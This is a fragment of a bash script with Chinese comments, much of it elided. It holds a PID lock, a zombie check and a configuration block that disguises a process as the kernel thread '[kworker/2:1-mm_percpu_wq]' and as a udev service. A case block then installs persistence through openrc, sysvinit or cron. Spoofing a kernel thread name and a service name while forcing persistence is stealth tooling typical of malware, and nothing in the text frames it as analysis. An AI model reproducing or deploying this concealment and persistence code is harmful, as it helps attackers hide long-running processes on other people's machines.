...
LOCK_FILE="${PID_RECORD}.lock"

# 原子锁：防止 openrc/cron 双启动竞态（bash noclobber 使用 O_CREAT|O_EXCL）
...
if [[ -f "${PID_RECORD}" ]]; then
    ...
    if [[ -n "${OLD_PID}" ]] && kill -0 "${OLD_PID}" 2>/dev/null; then
        # 排除僵尸：kill -0 对 Z 状态进程仍返回 0
        _state=$(awk '{print $3}' "/proc/${OLD_PID}/stat" 2>/dev/null)
        if [[ "${_state}" != "Z" ]]; then
...
# ─── 配置参数 ─────────────────────────────────────────────────────────────────
DISGUISE_NAME="udev-hwdb-helper"
PROC_NAME="[kworker/2:1-mm_percpu_wq]"
SERVICE_NAME="udev-hwdb-cleanup"
...
case "${INIT_SYS}" in
    ...
    openrc)
        ...
        command -v crontab &>/dev/null && persist_cron "${WRAPPER_PATH}" "${SERVICE_NAME}" || true
        ;;
    upstart|sysvinit)
        ...
        ;;
    cron)
        persist_cron "${WRAPPER_PATH}" "${SERVICE_NAME}"
        ;;
    none)
        warn "  未找到可用的持久化机制"
        ;;
